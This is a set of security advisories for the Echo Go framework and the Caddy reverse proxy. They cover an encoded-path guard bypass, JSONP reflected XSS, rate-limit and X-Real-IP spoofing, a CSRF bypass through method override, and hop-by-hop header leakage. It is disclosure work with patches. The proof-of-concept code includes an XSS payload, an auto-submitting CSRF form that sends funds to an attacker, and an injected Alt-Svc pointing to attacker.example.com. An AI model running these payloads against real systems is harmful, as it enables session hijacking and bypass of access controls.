items.content_html:
Summary

When middleware.Static is mounted globally (e.Use(middleware.Static(...))) and an application relies on a route- or group-level middleware guard to restrict a path that also falls under the served static root, a %2F-encoded request bypasses that guard while the file is still served. This is the same encoding/decoding mismatch fixed for StaticFS/StaticDirectoryHandler in CVE-2026-55677 / GHSA-vfp3-v2gw-7wfq, but the fix did not cover the middleware.Static path. In addition, the StaticConfig.EnablePathUnescaping docstring states the default configuration prevents exactly this bypass, which is inaccurate for the global-mount case.

This is not path traversal: no file outside the static root is accessed. The served file lives inside the static root; the issue is that access-control expectations set by a route guard are inconsistent between the literal and %2F-encoded forms of the same path.

Details

Root cause — the router and the static handler disagree on how to interpret %2F:

  • The router matches routes on the raw, still-encoded path, so GET /admin%2Fsecret.txt does not match a /admin/... route or group; any middleware attached to that route/group is therefore skipped.
  • middleware.Static selects its path source in middleware/static.go (L219): with a global e.Use mount there is no wildcard route, so it uses c.Request().URL.Path, which net/http has already decoded (%2F → /). It then path.Cleans (L235) and Opens (~L259) admin/secret.txt, serving the file.

Net effect: for the literal path the guard runs; for the %2F-encoded path the guard is skipped but the same file is served.

Relevant code:

  • middleware/static.go ~L219 (p := c.Request().URL.Path), ~L235 (path.Clean), ~L259 (currentFS.Open)
  • StaticConfig.EnablePathUnescaping docstring (static.go ~L60-67) — claims the default prevents the /admin%2fprivate.txt → /admin/* guard bypass; this is not true for the global mount.

Relationship to prior advisories:

  • CVE-2026-55677 / GHSA-vfp3-v2gw-7wfq (patched 5.2.0): same %2F router-vs-handler mismatch, but fixed for StaticFS/StaticDirectoryHandler. The middleware.Static path was not covered — this report is that gap.
  • CVE-2026-25766 / GHSA-pgvm-wxw2-hrv9 (patched 5.0.3): a different issue (Windows backslash traversal outside the root). Referenced only to disambiguate; not the same as this report.

PoC

Environment: golang:1.25, module using the official release (go get github.com/labstack/echo/v5@v5.3.1, no local replace). Static root public/ contains a marker file public/admin/secret.txt = SECRET.

Minimal app (the pattern under test: static served globally + a group guard intended to protect /admin):

package main

import (
    "net/http"

    "github.com/labstack/echo/v5"
    "github.com/labstack/echo/v5/middleware"
)

func main() {
    e := echo.New()
    e.Use(middleware.Static("public")) // serves ./public globally (default filesystem)

    admin := e.Group("/admin", func(next echo.HandlerFunc) echo.HandlerFunc {
        return func(c *echo.Context) error { return c.String(http.StatusUnauthorized, "auth required") }
    })
    admin.GET("/secret.txt", func(c *echo.Context) error { return c.String(http.StatusOK, "handler") })

    e.Start(":1323")
}

Requests (unauthenticated):

# Literal: route matches -> group guard runs
curl -i http://localhost:1323/admin/secret.txt
# => 401

# %2F-encoded: route does NOT match -> guard skipped, but middleware.Static serves the file
curl -i --path-as-is http://localhost:1323/admin%2Fsecret.txt
# => 200, body: SECRET

Observed on v5.3.1: literal → 401; %2F → 200 with the file contents. For contrast, serving via the (patched) e.StaticFS("/") returns 404 for the same %2F request, showing the middleware.Static path was not covered by the CVE-2026-55677 fix.

Impact

An unauthenticated remote user can retrieve a file served by middleware.Static even when the application attached a route/group middleware guard to that path, by substituting / with %2F. The consequence is limited to files already inside the served static root (CWE-863 authorization inconsistency; CWE-436 interpretation conflict) — there is no access to files outside the static root.

Honest caveat on validity / severity: this only has security impact for applications that (a) serve a directory statically to the public and (b) place a sensitive file inside that same directory while relying on a route-level guard to protect it. That combination is arguably a misconfiguration — a statically-served directory is public by design — so maintainers may reasonably classify this as a documentation fix (correct the EnablePathUnescaping claim) or won't-fix rather than a code vulnerability. It is filed primarily because (1) the router-vs-handler %2F inconsistency is the exact class fixed in CVE-2026-55677 but left uncovered for middleware.Static, and (2) the docstring currently promises protection it does not provide.

Patches

Fixed in github.com/labstack/echo/v5 v5.4.0 and github.com/labstack/echo/v4 v4.16.0. With the default settings, the Static middleware resolves files from the same form of the path that the router matched, so percent-encoded paths such as /admin%2Fsecret.txt or /%61dmin/secret.txt no longer reach a file under a guarded route. Paths with ., .. or empty segments are no longer served.

Note: middleware registered with Echo#Use runs before route and group middleware, so route guards never protect files served by a global Static middleware. Keep protected files outside its root directory, or serve them with Echo#Static behind the guard.

Workarounds

Keep files that need protection outside the Static middleware's root directory.

Summary

The Context.JSONP, Context.JSONPBlob, and internal jsonPBlob helper in context.go directly concatenate the caller-supplied callback parameter into a JavaScript response without any validation, escaping, or allow-listing.

This creates a high-impact reflected XSS that can be triggered by any route passing attacker-controlled data (query string, form, header, path param, etc.) into the callback.

Present in current master and v5.1.0 (latest release).

Vulnerable Code (verbatim)

func (c *Context) jsonPBlob(code int, callback string, i any) (err error) {
    c.writeContentType(MIMEApplicationJavaScriptCharsetUTF8)
    c.response.WriteHeader(code)
    if _, err = c.response.Write([]byte(callback + "(")); err != nil {
        return
    }
    if err = c.echo.JSONSerializer.Serialize(c, i, ""); err != nil {
        return
    }
    if _, err = c.response.Write([]byte(");")); err != nil {
        return
    }
    return
}

func (c *Context) JSONP(code int, callback string, i any) (err error) {
    return c.jsonPBlob(code, callback, i)
}

func (c *Context) JSONPBlob(code int, callback string, b []byte) (err error) {
    c.writeContentType(MIMEApplicationJavaScriptCharsetUTF8)
    c.response.WriteHeader(code)
    if _, err = c.response.Write([]byte(callback + "(")); err != nil {
        return
    }
    if _, err = c.response.Write(b); err != nil {
        return
    }
    _, err = c.response.Write([]byte(");"))
    return
}

No sanitization is performed on the callback string.

Exploit (one-request repro)

Any route using the official pattern is vulnerable:

Goe.GET("/api", func(c echo.Context) error {
    return c.JSONP(200, c.QueryParam("callback"), map[string]string{"status": "ok"})
})

Attacker request:

GET /api?callback=alert(document.domain)%2f%2f HTTP/1.1
Host: target.com

Server response:

Content-Type: application/javascript; charset=utf-8

alert(document.domain)//({"status":"ok"});

→ Immediate arbitrary JavaScript execution (full reflected XSS).

Impact

  • Session hijacking, cookie theft, account takeover, keylogging, defacement.
  • Works even with strict CSP (response is served as application/javascript).

Affected Versions

  • All versions ≤ v5.1.0 (including current master)

Workarounds

Manually sanitize the callback before calling JSONP/JSONPBlob:

Gofunc safeCallback(cb string) string {
    if matched, _ := regexp.MatchString(`^[a-zA-Z0-9_.\[\]]+$`, cb); !matched {
        return "callback"
    }
    return cb
}

Or migrate away from JSONP entirely (use CORS + application/json).

References

  • https://github.com/labstack/echo/blob/master/context.go
  • https://echo.labstack.com/docs/cookbook/jsonp

Patches

Fixed in github.com/labstack/echo/v5 v5.4.0 and github.com/labstack/echo/v4 v4.16.0. Context.JSONP and Context.JSONPBlob accept only a callback that is empty, a JavaScript identifier or a dot-separated path of identifiers (ASCII letters, digits, _ and $); any other callback returns a 400 Bad Request error wrapping ErrInvalidJSONPCallback and nothing is written. JSONP responses also carry X-Content-Type-Options: nosniff.

Workarounds

Validate the callback in your handler before calling Context.JSONP, for example against ^[A-Za-z_$][A-Za-z0-9_$]*(\.[A-Za-z_$][A-Za-z0-9_$]*)*$, and set X-Content-Type-Options: nosniff. JSONP responses can be read by any website with the user's cookies, so do not serve data that requires authentication through JSONP.

References

  • https://github.com/labstack/echo/security/advisories/GHSA-h9g5-28mm-hx3g
  • https://github.com/labstack/echo/commit/b838391e2eade87ae7e5a09d7bb5087bec271ec1
  • https://github.com/labstack/echo/commit/fc410094b2f3415cf2bf5204082137b205bfd5af
  • https://github.com/labstack/echo/releases/tag/v4.16.0
  • https://github.com/labstack/echo/releases/tag/v5.4.0
  • https://github.com/advisories/GHSA-h9g5-28mm-hx3g

items.content_html:
Summary

When echo.New() is used without explicitly setting Echo#IPExtractor, the RealIP() method falls back to reading the client-supplied X-Forwarded-For (or X-Real-IP) header without any proxy-origin validation. The default RateLimiter() middleware derives its per-client identifier from ctx.RealIP(), so an attacker can rotate arbitrary values in the X-Forwarded-For header on each request to obtain a fresh rate-limit bucket and bypass IP-based throttling entirely.

Affected Component

  • context.go — (*Context).RealIP() (lines 186–208), legacy fallback branch (lines 190–200)
  • middleware/rate_limiter.go — DefaultRateLimiterConfig.IdentifierExtractor (lines 46–58); RateLimiter() (lines 71–76)
  • echo.go — New() (lines 326–343), IPExtractor left nil by default

Description

RealIP() unconditionally trusts X-Forwarded-For when IPExtractor is unset

Context.RealIP() (context.go:186-208) first checks c.echo.IPExtractor. When this field is nil (the default for echo.New()), it falls through to legacy behavior and returns the first IP from the X-Forwarded-For header — the position an attacker has full control over:

// context.go:186-200
func (c *Context) RealIP() string {
    if c.echo != nil && c.echo.IPExtractor != nil {
        return c.echo.IPExtractor(c.request)
    }
    // Fall back to legacy behavior
    if ip := c.request.Header.Get(HeaderXForwardedFor); ip != "" {
        i := strings.IndexAny(ip, ",")
        if i > 0 {
            xffip := strings.TrimSpace(ip[:i])
            xffip = strings.TrimPrefix(xffip, "[")
            xffip = strings.TrimSuffix(xffip, "]")
            return xffip   // ← attacker-controlled first IP
        }
        return ip
    }
    if ip := c.request.Header.Get(HeaderXRealIP); ip != "" {
        ...
        return ip          // ← also attacker-controlled
    }
    ra, _, _ := net.SplitHostPort(c.request.RemoteAddr)
    return ra
}

Rate limiter default identifier extractor calls RealIP() unconditionally

DefaultRateLimiterConfig (rate_limiter.go:46-58) sets the identifier extractor to ctx.RealIP() with no guard for whether a safe IPExtractor is configured:

// rate_limiter.go:46-58
var DefaultRateLimiterConfig = RateLimiterConfig{
    Skipper: DefaultSkipper,
    IdentifierExtractor: func(ctx *echo.Context) (string, error) {
        id := ctx.RealIP()   // ← reads attacker-controlled header
        return id, nil
    },
    ...
}

RateLimiter(store) (rate_limiter.go:71-76) copies DefaultRateLimiterConfig directly:

// rate_limiter.go:71-76
func RateLimiter(store RateLimiterStore) echo.MiddlewareFunc {
    config := DefaultRateLimiterConfig
    config.Store = store
    return RateLimiterWithConfig(config)
}

The result is that the most common usage pattern — e.GET("/path", h, middleware.RateLimiter(store)) — produces a rate limiter whose per-client identifier is fully controlled by the requester.

Framework acknowledges the issue for IP extraction but the rate limiter carries no warning

ip.go:27 explicitly states the default is insecure:

"Note: if you don't set Echo#IPExtractor explicitly, Echo fallback to legacy behavior, which is not a good choice."

And ip.go:117-119:

"In default behavior, Echo sees all of first XFF header, X-Real-IP header and IP from network layer. As you might already notice, after reading this article, this is not good. Sole reason this is default is just backward compatibility."

The IPExtractor mechanism (ExtractIPDirect(), ExtractIPFromXFFHeader(), ExtractIPFromRealIPHeader()) in ip.go exists precisely to close this gap. However, the RateLimiter() function and DefaultRateLimiterConfig have no corresponding warning and make no attempt to detect or flag that IPExtractor is unset, leaving operators who follow the standard rate limiter example silently exposed.

The test TestRateLimiterWithConfig_defaultConfig (rate_limiter_test.go:181-226) itself drives the rate limiter by setting X-Real-IP directly on the test request — demonstrating that the identifier is freely injectable without comment or mitigation.

Full execution chain

  1. Server starts with echo.New() (no IPExtractor set) and e.GET("/limited", h, middleware.RateLimiter(store))
  2. Attacker sends GET /limited with header X-Forwarded-For: 1.2.3.4 — rate bucket for 1.2.3.4 consumed
  3. Attacker sends GET /limited again with X-Forwarded-For: 1.2.3.4 — second token consumed; if burst is 1, next request would be 429
  4. Attacker sends GET /limited with X-Forwarded-For: 5.6.7.8 — new bucket created for 5.6.7.8, 200 OK returned
  5. Attacker repeats step 4 with arbitrary IPs — rate limit never triggers; unlimited requests served

Proof of Concept

package main

import (
    "net/http"
    echo "github.com/labstack/echo/v5"
    "github.com/labstack/echo/v5/middleware"
)

func main() {
    e := echo.New()
    // NOTE: IPExtractor deliberately NOT set — this is the default
    store := middleware.NewRateLimiterMemoryStore(1)
    e.GET("/limited", func(c *echo.Context) error {
        return c.String(http.StatusOK, "ok")
    }, middleware.RateLimiter(store))
    e.Logger.Fatal(e.Start(":1324"))
}

# First request with IP 1.1.1.1 — consumes burst token
curl -i -H 'X-Forwarded-For: 1.1.1.1' http://127.0.0.1:1324/limited
# HTTP/1.1 200 OK

# Second request with same IP — rate limited
curl -i -H 'X-Forwarded-For: 1.1.1.1' http://127.0.0.1:1324/limited
# HTTP/1.1 429 Too Many Requests

# Third request with DIFFERENT spoofed IP — bypass: new bucket, 200 OK
curl -i -H 'X-Forwarded-For: 2.2.2.2' http://127.0.0.1:1324/limited
# HTTP/1.1 200 OK

# Repeat indefinitely with rotating IPs — rate limit never triggers
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" -H "X-Forwarded-For: 10.0.0.$i" http://127.0.0.1:1324/limited

Summary

The MethodOverride middleware accepts any non-empty string as the override target method — including safe methods (GET, HEAD, OPTIONS, TRACE) — when rewriting a POST request. When MethodOverride is registered before CSRF in the post-routing middleware chain (e.Use()), it rewrites the request method to a safe method before CSRF evaluates it. The CSRF middleware then skips token validation for the now-safe method, allowing state-changing POST handlers to execute without any CSRF check. Both the legacy token path and the modern Sec-Fetch-Site protection path are bypassed simultaneously.

Affected Component

  • middleware/method_override.go — MethodOverrideConfig.ToMiddleware() (lines 55–71): no whitelist on the override target method
  • middleware/csrf.go — CSRFConfig.ToMiddleware() (lines 188–189): safe-method bypass branch reads the already-rewritten method
  • middleware/csrf.go — checkSecFetchSiteRequest() (line 283): Sec-Fetch-Site safe check also reads the rewritten method

Description

MethodOverride accepts safe methods as override targets

MethodOverrideConfig.ToMiddleware() (method_override.go:55-71) restricts the source method (only POST requests are overrideable) but applies no whitelist to the target:

// method_override.go:61-67
req := c.Request()
if req.Method == http.MethodPost {
    m := config.Getter(c)
    if m != "" {
        req.Method = m   // ← any non-empty string accepted, including "GET"
    }
}

The docstring's security claim — "For security reasons, only POST method can be overridden" — refers only to the source-method restriction. There is no guard preventing POST from being rewritten to GET, HEAD, OPTIONS, or TRACE. The test suite (method_override_test.go) only tests POST→DELETE and POST→PUT; POST→GET is never tested or blocked.

CSRF safe-method branch reads the already-rewritten method

CSRFConfig.ToMiddleware() (csrf.go:188-189) makes its validation decision based on c.Request().Method at the time it runs:

// csrf.go:188-189
switch c.Request().Method {
case http.MethodGet, http.MethodHead, http.MethodOptions, http.MethodTrace:
    // skip validation — no token check
default:
    // validate CSRF token

If MethodOverride has already run and set req.Method = "GET", this switch falls into the skip branch regardless of the original HTTP method or what handler was matched.

The Sec-Fetch-Site-based path in checkSecFetchSiteRequest() (csrf.go:283) is identically vulnerable:

// csrf.go:283
isSafe := slices.Contains(safeMethods, c.Request().Method)

With req.Method = "GET" (already rewritten), isSafe = true and the function returns true — the request is allowed even when Sec-Fetch-Site is cross-site. Both CSRF protection paths are bypassed in a single step.

Execution chain

In echo.go:700, routing and middleware wrapping are performed in one step:

h = applyMiddleware(e.router.Route(c), e.middleware...)
  1. e.router.Route(c) evaluates with req.Method = "POST" → matches and binds the POST /transfer handler
  2. applyMiddleware wraps it: MethodOverride → CSRF → postHandler

At request execution time: 3. MethodOverride runs: req.Method == "POST" → reads form field _method = "GET" → req.Method = "GET" → calls next 4. CSRF runs: c.Request().Method = "GET" → case http.MethodGet → skips token validation → calls next 5. postHandler runs (the handler matched in step 1 — the original POST /transfer state-change handler)

The state-changing handler executes with no CSRF token validation and with no Sec-Fetch-Site check.

The missing target-method whitelist is the root cause

The legitimate use case for MethodOverride is allowing HTML forms (which only support GET/POST) to send PUT, DELETE, or PATCH requests. There is no legitimate scenario in which an HTML form needs to rewrite POST to GET — that can always be expressed as an ordinary GET request. Allowing POST→GET (and HEAD/OPTIONS/TRACE) serves no valid purpose and is inherently dangerous when any safe-method-aware security middleware (CSRF, logging, audit) appears downstream.

Proof of Concept

package main

import (
    "net/http"
    echo "github.com/labstack/echo/v5"
    "github.com/labstack/echo/v5/middleware"
)

func main() {
    e := echo.New()
    // MethodOverride before CSRF — both in e.Use() (post-routing)
    e.Use(middleware.MethodOverrideWithConfig(middleware.MethodOverrideConfig{
        Getter: middleware.MethodFromForm("_method"),
    }))
    e.Use(middleware.CSRF())
    e.POST("/transfer", func(c *echo.Context) error {
        return c.String(http.StatusOK, "transfer executed")
    })
    e.Logger.Fatal(e.Start(":18080"))
}

# Baseline — CSRF correctly blocks a POST without a valid token
curl -i -X POST 'http://127.0.0.1:18080/transfer' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'amount=100'
# HTTP/1.1 400 Bad Request (missing CSRF token)

# Bypass — _method=GET rewrites method before CSRF runs, skipping token validation
curl -i -X POST 'http://127.0.0.1:18080/transfer' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data '_method=GET&amount=100'
# HTTP/1.1 200 OK
# transfer executed

# Browser-based CSRF PoC (attacker's page, auto-submits on load):
# <form method="POST" action="https://victim.example/transfer" id="f">
#   <input name="_method" value="GET">
#   <input name="amount" value="1000">
#   <input name="to" value="attacker_account">
# </form>
# <script>document.getElementById('f').submit();</script>

The same bypass works with MethodFromHeader (X-HTTP-Method-Override: GET) and MethodFromQuery (?_method=GET).

Impact

  • Any state-changing endpoint protected by CSRF() is reachable without a valid CSRF token when the vulnerable middleware ordering is present
  • The Sec-Fetch-Site modern-browser CSRF protection is bypassed simultaneously — browsers that support Sec-Fetch-Site provide no additional defense
  • Applicable attacks include: fund transfers, password/email changes, account deletion, privilege escalation, data manipulation — any POST-protected operation
  • Audit logs may record GET as the HTTP method for what were actually state-changing operations

Recommended Remediation

Option 1: Whitelist only unsafe methods as override targets in MethodOverride (preferred)

The root cause is that MethodOverride accepts safe methods as targets. Restricting the override to legitimately overrideable methods (PUT, PATCH, DELETE) closes the bypass regardless of middleware ordering:

// method_override.go — illustrative fix
var allowedOverrideMethods = map[string]bool{
    http.MethodPut:    true,
    http.MethodPatch:  true,
    http.MethodDelete: true,
}

// in ToMiddleware:
if req.Method == http.MethodPost {
    m := config.Getter(c)
    if m != "" && allowedOverrideMethods[m] {
        req.Method = m
    }
}

Option 2: Use e.Pre() for MethodOverride and document the ordering requirement

Placing MethodOverride in e.Pre() (pre-routing middleware) causes the router to match the overridden method, not the original POST. If only POST /transfer is registered, a POST-to-GET override results in a 405/404 — the handler never executes. Add an explicit documentation warning that MethodOverride must not be placed in e.Use() when CSRF middleware is also registered:

//
// IMPORTANT: Register this middleware with e.Pre(), not e.Use().
// If registered with e.Use() before CSRF middleware, method rewriting
// occurs after route matching but before CSRF validation, allowing
// attackers to bypass CSRF token checks by specifying _method=GET.
func MethodOverride() echo.MiddlewareFunc {

Option 1 is strongly preferred as it closes the vulnerability at the source and is safe regardless of middleware placement.

This vulnerability was discovered and reported by bugbunny.ai.

Fixed in github.com/labstack/echo/v5 v5.4.0 and github.com/labstack/echo/v4 v4.16.0. The MethodOverride middleware no longer overrides a POST to GET, HEAD, OPTIONS, TRACE or CONNECT.

Workarounds

Register MethodOverride with Echo#Pre (as documented), register CSRF before MethodOverride, or use the default header getter (X-HTTP-Method-Override), which a cross-site form cannot set.

Summary

The Echo proxy middleware (middleware/proxy.go) preserves an incoming X-Real-IP header verbatim and forwards it to the upstream service when Echo#IPExtractor is not configured — which is the default. Because any HTTP client can supply an arbitrary X-Real-IP value, an attacker can cause Echo to relay a spoofed client IP address to every upstream service behind the proxy, undermining upstream IP-based access controls, rate limiting, audit logging, and geo-restriction.

Affected Component

  • middleware/proxy.go — ProxyConfig.ToMiddleware(), header-rewriting block (lines 351–355)

Description

The header-preservation condition passes spoofed values to upstream

ProxyConfig.ToMiddleware() (proxy.go:338-405) prepares forwarding headers before dispatching each request. The X-Real-IP rewrite logic at lines 351-355 reads:

// proxy.go:351-355
// Basically it's not good practice to unconditionally pass incoming x-real-ip header to upstream.
// However, for backward compatibility, legacy behavior is preserved unless you configure Echo#IPExtractor.
if req.Header.Get(echo.HeaderXRealIP) == "" || c.Echo().IPExtractor != nil {
    req.Header.Set(echo.HeaderXRealIP, c.RealIP())
}

The condition is TRUE (and therefore overwrites the header with a derived value) only when:

  • The header is absent — req.Header.Get(echo.HeaderXRealIP) == ""; or
  • IPExtractor is explicitly configured — c.Echo().IPExtractor != nil

The condition is FALSE — and the header is left unchanged — when the request arrives with an X-Real-IP header already set and IPExtractor is nil. Because Echo.New() leaves IPExtractor as nil, this is the out-of-the-box behaviour for every application that uses Proxy() or ProxyWithConfig() without extra configuration.

An attacker who sets X-Real-IP to any value causes Echo to forward exactly that value to the upstream, with no modification or validation.

The comment in the source code confirms intent and the security gap

The inline comment at line 351-352 explicitly states:

"Basically it's not good practice to unconditionally pass incoming x-real-ip header to upstream. However, for backward compatibility, legacy behavior is preserved unless you configure Echo#IPExtractor."

The framework is aware that the default is insecure and retains it for backward compatibility. No warning appears in the Proxy() or ProxyWithConfig() documentation, so operators who follow the standard setup example receive a silently insecure proxy configuration.

This is structurally identical to the documented insecurity in ip.go:27:

"Note: if you don't set Echo#IPExtractor explicitly, Echo fallback to legacy behavior, which is not a good choice."

Full execution chain

  1. Attacker sends GET /api/admin to the Echo proxy with header X-Real-IP: 203.0.113.1 (a trusted corporate IP)
  2. ToMiddleware() evaluates the guard at line 353: header is present (!= ""), IPExtractor is nil → condition is FALSE
  3. req.Header.Set is not called; the upstream request carries the original, attacker-supplied X-Real-IP: 203.0.113.1
  4. Upstream service checks X-Real-IP against its IP allowlist → finds 203.0.113.1 → grants access
  5. Attacker reaches an endpoint that should be restricted to the corporate IP range

Secondary impact path (audit poisoning):

  • All upstream log entries, rate-limit counters, and geo-restriction checks are evaluated against 203.0.113.1 rather than the real client IP, rendering audit trails and security analytics unreliable.

Proof of Concept

package main

import (
    "fmt"
    "log"
    "net/http"
    echo "github.com/labstack/echo/v5"
    "github.com/labstack/echo/v5/middleware"
)

func main() {
    // Upstream server: echoes back the X-Real-IP it received
    upstream := http.NewServeMux()
    upstream.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        fmt.Fprintf(w, "upstream sees X-Real-IP: %s\n", r.Header.Get("X-Real-IP"))
    })
    go http.ListenAndServe(":9000", upstream)

    // Echo proxy — IPExtractor deliberately NOT set (the default)
    e := echo.New()
    targets := []*middleware.ProxyTarget{{URL: mustParse("http://127.0.0.1:9000")}}
    e.Use(middleware.Proxy(middleware.NewRoundRobinBalancer(targets)))
    log.Fatal(e.Start(":1323"))
}

# Without spoofed header — upstream sees actual peer address
curl http://127.0.0.1:1323/
# upstream sees X-Real-IP: 127.0.0.1

# With spoofed header — upstream sees attacker-supplied value
curl -H 'X-Real-IP: 198.51.100.77' http://127.0.0.1:1323/
# upstream sees X-Real-IP: 198.51.100.77

The attacker-supplied IP 198.51.100.77 arrives at the upstream unchanged.

Impact

  • Upstream IP-based access controls (allowlists, blocklists, geo-restrictions) can be bypassed by supplying the expected IP in X-Real-IP
  • Upstream rate limiters that key on X-Real-IP are bypassable (same class as the Echo rate-limiter finding, now on every upstream service)
  • Audit logs, intrusion detection systems, and SIEM tools that rely on X-Real-IP record the attacker-chosen IP, not the real source — forensic trails are poisoned
  • Any upstream admin endpoint restricted by IP allowlist is reachable by any attacker who knows or guesses a trusted IP address

Recommended Remediation

Option 1: Always overwrite X-Real-IP from an authoritative source (preferred)

Remove the conditional that preserves the incoming header. Echo, as the edge proxy, is the only authoritative source for the real client IP:

// proxy.go — always set X-Real-IP from an authoritative source
req.Header.Set(echo.HeaderXRealIP, c.RealIP())

For this to be safe, operators using Proxy() should also configure IPExtractor:

e.IPExtractor = echo.ExtractIPDirect() // no upstream proxy
// or
e.IPExtractor = echo.ExtractIPFromXFFHeader() // behind a trusted upstream LB

Option 2: Document and warn in Proxy() godoc

If backward compatibility must be preserved, add a prominent security warning to Proxy() and ProxyWithConfig():

// Proxy returns a Proxy middleware.
//
// SECURITY: By default, an incoming X-Real-IP header supplied by the client
// is forwarded to the upstream unchanged. This allows any client to spoof its
// IP identity to upstream services. Configure Echo#IPExtractor before using
// this middleware to ensure X-Real-IP is derived from a trusted source:
//
//   e.IPExtractor = echo.ExtractIPDirect()
//
// See https://echo.labstack.com/guide/ip-address for details.
func Proxy(balancer ProxyBalancer) echo.MiddlewareFunc {

Credit

This vulnerability was discovered and reported by bugbunny.ai.

Patches

Fixed in github.com/labstack/echo/v5 v5.4.0: the Proxy middleware always sets X-Real-IP from Context.RealIP(), which is the address of the direct peer unless Echo#IPExtractor is configured.

github.com/labstack/echo/v4 is not changed, because v4's Context.RealIP() without Echo#IPExtractor trusts X-Forwarded-For and X-Real-IP by design, and changing that default would merge all clients behind a proxy into one rate-limit bucket.

Workarounds

Configure Echo#IPExtractor for your deployment, for example e.IPExtractor = echo.ExtractIPDirect() when there is no proxy in front of the application, or echo.ExtractIPFromXFFHeader() / echo.ExtractIPFromRealIPHeader() (with TrustIPRange for proxies on public addresses). With an extractor set, the Proxy middleware overwrites X-Real-IP in v4 too.

AI Disclosure

This vulnerability was discovered via deepseek-v4-pro[1m] for finding potential vulnerabilities / inconsistencies in the code base. I made the AI check if Caddy is compliant with various RFCs, incl. 7230. I also used it to help write the PoC, since it was honestly much faster than writing it by hand. I also let it write parts of this advisory text for brevity's sake, but had to rewrite half of it by hand.

Summary

Caddy's reverse proxy fails to strip RFC 7230 hop-by-hop headers from upstream responses when handling WebSocket upgrades (HTTP 101 Switching Protocols). Headers including Alt-Svc, Keep-Alive, Proxy-Authenticate, Transfer-Encoding, or Trailer, which Caddy actually correctly strips for normal HTTP responses, pass through unfiltered to the client during protocol upgrades. An upstream that sets these headers (intentionally or otherwise) can inject them into client responses, enabling connection hijacking via Alt-Svc, cookie injection via Set-Cookie, and proxy authentication phishing.

The normal response path in finalizeResponse correctly strips all hop-by-hop headers before forwarding, but the 101 code path returns early, skipping the stripping entirely.

Details

In modules/caddyhttp/reverseproxy/reverseproxy.go, the finalizeResponse method (line 1178) handles upstream responses. For all normal responses, it strips hop-by-hop headers before copying to the client:

// reverseproxy.go:1194-1198
removeConnectionHeaders(res.Header)
for _, h := range hopHeaders {
    res.Header.Del(h)
}

However, the 101 Switching Protocols check at line 1187 returns before this stripping code:

// reverseproxy.go:1186-1192
if res.StatusCode == http.StatusSwitchingProtocols {
    var wg sync.WaitGroup
    h.handleUpgradeResponse(logger, &wg, rw, req, res)
    wg.Wait()
    return nil  // <-- returns BEFORE removeConnectionHeaders and hopHeaders loop
}

Inside handleUpgradeResponse (streaming.go:60-91), all upstream response headers are copied to the client without any hop-by-hop filtering:

// streaming.go:88-91
copyHeader(rw.Header(), res.Header)        // copies ALL upstream headers
normalizeWebsocketHeaders(rw.Header())     // only remaps Sec-WebSocket-* keys

The normalizeWebsocketHeaders function (line 714) only handles WebSocket-specific header key mapping (Sec-Websocket-* to Sec-WebSocket-*). It does not strip hop-by-hop headers.

Hop-by-Hop Headers That Leak Through

Defined at reverseproxy.go:1681-1692:

Alt-Svc, Connection, Proxy-Connection, Keep-Alive, Proxy-Authenticate,
Proxy-Authorization, Te, Trailer, Transfer-Encoding, Upgrade

All 10 are stripped from normal responses. None are stripped from WebSocket upgrade responses.

For HTTP/2 and HTTP/3 WebSocket connections (extended CONNECT with :protocol: websocket), Caddy converts the upstream's 101 into a 200 OK for the client (streaming.go:99-104). The leaked headers arrive in a standard HTTP 200 response that browsers fully process, making Alt-Svc hijacking and Set-Cookie injection practically exploitable.

Normal (200): removeConnectionHeaders() runs, hopHeaders loop runs -> headers stripped Upgrade (101): handleUpgradeResponse() runs, returns early -> headers are NOT stripped

This is the only response code path in the reverse proxy that bypasses hop-by-hop header stripping.

PoC

Caddy config:

:8080 {
    reverse_proxy localhost:8083
}

Script:

import socket

UPSTREAM = (
    b"HTTP/1.1 101 Switching Protocols\r\n"
    b"Upgrade: websocket\r\n"
    b"Connection: Upgrade\r\n"
    b"Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=\r\n"
    b"Alt-Svc: h2=\"attacker.example.com:443\"; ma=86400\r\n"
    b"Keep-Alive: timeout=999\r\n"
    b"Proxy-Authenticate: Basic realm=\"phish\"\r\n"
    b"Set-Cookie: injected=malicious; Path=/\r\n"
    b"\r\n"
)

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 8083))
s.listen(1)
conn, _ = s.accept()
conn.send(UPSTREAM)

Curl:

curl -v \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 13" \
  http://localhost:8080/ws 2>&1

Output: 

< HTTP/1.1 101 Switching Protocols
< Alt-Svc: h2="attacker.example.com:443"; ma=86400
< Connection: Upgrade
< Keep-Alive: timeout=999
< Proxy-Authenticate: Basic realm="phish"
< Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
< Server: Caddy
< Set-Cookie: injected=malicious; Path=/
< Upgrade: websocket

Alt-Svc, Keep-Alive, and Proxy-Authenticate are hop-by-hop headers that MUST NOT be retransmitted by proxies per RFC 7230 §6.1. They all appear in the response.

Same upstream, same headers but on a 200 response. Caddy strips Alt-Svc correctly:

curl -v http://localhost:8080/
# Alt-Svc is absent

Impact

This is a hop-by-hop header leakage vuln (I think CWE-444 fits closest?). The proxy fails to enforce the RFC 7230 §6.1 requirement that hop-by-hop headers must not be forwarded across proxy boundaries.

Any Caddy deployment that proxies WebSocket connections, especially those using HTTP/2 or HTTP/3 (where the 101-to-200 conversion makes headers fully processable by browsers) has this issue.

How an attack might look: A company serves app.example.com behind Caddy, with HTTP/2 enabled. The app uses WebSockets for real-time notifications (i.e. every page load opens one). The upstream app gets compromised (unpatched CMS plugin, leaked CI credential, dependency confusion). The attacker adds one line to the WebSocket handler: Set-Cookie: session=hijack; Path=/.

Now every visitor to app.example.com gets the attacker's session cookie written into their browser. The app uses the session cookie as the sole authentication token. When a user reloads the page or navigates to another part of the app, their browser sends session=hijack along with the request. The attacker submits the same value from their own browser. They get logged in as that user.

Caddy strips this header on normal HTTP responses. It strips hop-by-hop headers on the request side, basically everywhere except this path.

Suggested Fix

I'll add my fix to the branch in this security advisory.

Contact Details

